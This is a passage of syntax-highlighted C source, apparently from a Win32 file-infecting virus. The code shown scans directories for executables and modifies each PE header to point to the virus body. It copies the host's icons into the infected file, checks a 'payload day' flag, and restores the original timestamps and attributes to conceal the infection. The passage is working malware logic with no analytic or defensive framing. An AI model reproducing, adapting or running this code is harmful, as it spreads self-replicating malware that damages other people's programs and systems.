                   </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SIZEOF_RESOURCE_DATA</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">pTgt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">pRsrcStart</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0xD0</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">pSrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HostLargeIcon</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SIZEOF_LARGE_ICON</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTgt</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pSrc</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IconImages</span><span class="sc10">.</span><span class="sc11">pSmallIcon</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">bPayLoadDay</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SIZEOF_SMALL_ICON</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTgt</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pSrc</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc10">((</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">pRsrcStart</span><span class="sc10">)[</span><span class="sc4">0x2E</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">((</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">pRsrcStart</span><span class="sc10">)[</span><span class="sc4">0x4E4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc0">
                   </span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_RESOURCE</span><span class="sc10">].</span><span class="sc0">
                   </span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc0">
                   </span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_RESOURCE</span><span class="sc10">].</span><span class="sc0">
                   </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">
        </span><span class="sc11">pMZ</span><span class="sc10">-&gt;</span><span class="sc11">e_lfanew</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TgtVir</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#ifdef compr
</span><span class="sc0">        </span><span class="sc11">SystemTimeToFileTime</span><span class="sc10">(&amp;</span><span class="sc11">SystemTime</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">ftLastWriteTime</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc11">CloseUnmapFile</span><span class="sc10">(</span><span class="sc11">WRITE_ACCESS</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CancelFileSeek</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CancelFileSeek</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">BreakHere</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//can't use break; because of the 2 while's.
</span><span class="sc0">      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc9">#ifdef compr
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pComprBuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">GlobalFree</span><span class="sc10">(</span><span class="sc11">pComprBuf</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc11">pExt</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">SIZEOF_FILEEXT</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hFindFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindData</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">  </span><span class="sc11">BreakHere</span><span class="sc10">:</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFindFile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">CloseUnmapFile</span><span class="sc10">(</span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">WriteAccess</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">pMZ</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc9">#ifndef compr
</span><span class="sc0">  </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hHandle2</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WriteAccess</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">SetFileTime</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindData</span><span class="sc10">.</span><span class="sc11">ftLastWriteTime</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc9">#else
</span><span class="sc0">  </span><span class="sc11">CloseTruncFile</span><span class="sc10">(</span><span class="sc11">WriteAccess</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">GetEndOfPath</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pTgt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pSr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pTgtBegin</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pTgt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pSrEnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pSr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">pSrEnd</span><span class="sc10">++);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pSr</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">pSrEnd</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">pSrEnd</span><span class="sc10">[-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">pSrEnd</span><span class="sc10">[-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">':'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pSr</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">pSrEnd</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pTgt</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pSr</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pTgtBegin</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">pTgt</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">pTgt</span><span class="sc10">[-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*((</span><span class="sc11">PWORD</span><span class="sc10">)</span><span class="sc11">pTgt</span><span class="sc10">)++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'.\\'</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">*</span><span class="sc11">pTgt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\x0'</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">pTgt</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">PVOID</span><span class="sc0"> </span><span class="sc11">Rva2Raw</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">Rva</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">PIMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc11">pSectionHdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IMAGE_FIRST_SECTION</span><span class="sc10">(</span><span class="sc11">_pHostPE</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_pHostPE</span><span class="sc10">-&gt;</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pSectionHdr</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">Rva</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
        </span><span class="sc11">Rva</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">pSectionHdr</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pSectionHdr</span><span class="sc10">-&gt;</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PVOID</span><span class="sc10">)(</span><span class="sc11">Rva</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">pSectionHdr</span><span class="sc10">-&gt;</span><span class="sc11">VirtualAddress</span><span class="sc0">
                     </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pSectionHdr</span><span class="sc10">-&gt;</span><span class="sc11">PointerToRawData</span><span class="sc0">
                     </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pMZ</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">pSectionHdr</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">nSections</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#ifdef icon
</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">FixResources</span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY</span><span class="sc0"> </span><span class="sc11">pRsrcDir</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY_ENTRY</span><span class="sc0"> </span><span class="sc11">pRsrcDirEntry</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nCount</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">pRsrcDir</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">pRsrcDirEntry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY_ENTRY</span><span class="sc10">)(</span><span class="sc11">pRsrcDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pRsrcDir</span><span class="sc10">-&gt;</span><span class="sc11">NumberOfNamedEntries</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pRsrcDir</span><span class="sc10">-&gt;</span><span class="sc11">NumberOfIdEntries</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc11">pRsrcDirEntry</span><span class="sc10">-&gt;</span><span class="sc11">DataIsDirectory</span><span class="sc0">
      </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">FixResources</span><span class="sc10">(</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc2">//recursion..
</span><span class="sc0">                             </span><span class="sc11">pRsrcStart</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc11">pRsrcDirEntry</span><span class="sc10">-&gt;</span><span class="sc11">OffsetToDirectory</span><span class="sc10">))</span><span class="sc0">
      </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DATA_ENTRY</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">pRsrcStart</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">pRsrcDirEntry</span><span class="sc10">-&gt;</span><span class="sc11">OffsetToData</span><span class="sc10">)-&gt;</span><span class="sc11">OffsetToData</span><span class="sc0">
           </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">_RvaDelta</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pRsrcDirEntry</span><span class="sc10">++,</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#define LARGE_ICON 0
#define SMALL_ICON 1
</span><span class="sc0">
</span><span class="sc11">PICONIMAGE</span><span class="sc0"> </span><span class="sc11">GetDefaultIcon</span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY</span><span class="sc0"> </span><span class="sc11">pRsrcDir</span><span class="sc10">,</span><span class="sc0">
                          </span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">IconType</span><span class="sc10">,</span><span class="sc0">
                          </span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">bFalse</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY_ENTRY</span><span class="sc0"> </span><span class="sc11">pRsrcDirEntry</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PIMAGE_RESOURCE_DATA_ENTRY</span><span class="sc0"> </span><span class="sc11">pRsrcDataEntry</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PICONIMAGE</span><span class="sc0"> </span><span class="sc11">pIconImage</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nCount</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">pRsrcDir</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">pRsrcDirEntry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY_ENTRY</span><span class="sc10">)(</span><span class="sc11">pRsrcDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pRsrcDir</span><span class="sc10">-&gt;</span><span class="sc11">NumberOfNamedEntries</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pRsrcDir</span><span class="sc10">-&gt;</span><span class="sc11">NumberOfIdEntries</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">bFalse</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">pRsrcDirEntry</span><span class="sc10">-&gt;</span><span class="sc11">Id</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc11">RT_ICON</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pRsrcDirEntry</span><span class="sc10">-&gt;</span><span class="sc11">DataIsDirectory</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">pIconImage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetDefaultIcon</span><span class="sc10">(</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY</span><span class="sc10">,</span><span class="sc0">
                                          </span><span class="sc11">pRsrcStart</span><span class="sc10">,</span><span class="sc0">
                                          </span><span class="sc11">pRsrcDirEntry</span><span class="sc10">-&gt;</span><span class="sc11">OffsetToDirectory</span><span class="sc10">),</span><span class="sc0">
                                  </span><span class="sc11">IconType</span><span class="sc10">,</span><span class="sc0">
                                  </span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">pIconImage</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">pIconImage</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">pRsrcDataEntry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DATA_ENTRY</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc11">pRsrcStart</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc11">pRsrcDirEntry</span><span class="sc10">-&gt;</span><span class="sc11">OffsetToData</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">pIconImage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Raw</span><span class="sc10">(</span><span class="sc11">pRsrcDataEntry</span><span class="sc10">-&gt;</span><span class="sc11">OffsetToData</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biSize</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">BITMAPINFOHEADER</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biWidth</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IconType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">LARGE_ICON</span><span class="sc0">
                                           </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc0">
                                           </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biHeight</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IconType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">LARGE_ICON</span><span class="sc0">
                                            </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc4">64</span><span class="sc0">
                                            </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biPlanes</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biBitCount</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">pIconImage</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(++</span><span class="sc11">pRsrcDirEntry</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">GetDefaultIcons</span><span class="sc10">(</span><span class="sc11">PICONIMAGES</span><span class="sc0"> </span><span class="sc11">pIconImages</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">PVOID</span><span class="sc0"> </span><span class="sc11">pNEorPE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc10">)</span><span class="sc11">pNEorPE</span><span class="sc10">)-&gt;</span><span class="sc11">Signature</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IMAGE_NT_SIGNATURE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc0"> </span><span class="sc11">pPE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_pHostPE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc10">)</span><span class="sc11">pNEorPE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY</span><span class="sc0"> </span><span class="sc11">pRsrcDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
      </span><span class="sc11">pRsrcStart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
        </span><span class="sc11">Rva2Raw</span><span class="sc10">(</span><span class="sc11">pPE</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc0">
                     </span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_RESOURCE</span><span class="sc10">].</span><span class="sc0">
                     </span><span class="sc11">VirtualAddress</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">pIconImages</span><span class="sc10">-&gt;</span><span class="sc11">pLargeIcon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetDefaultIcon</span><span class="sc10">(</span><span class="sc11">pRsrcDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LARGE_ICON</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">pIconImages</span><span class="sc10">-&gt;</span><span class="sc11">pSmallIcon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetDefaultIcon</span><span class="sc10">(</span><span class="sc11">pRsrcDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SMALL_ICON</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
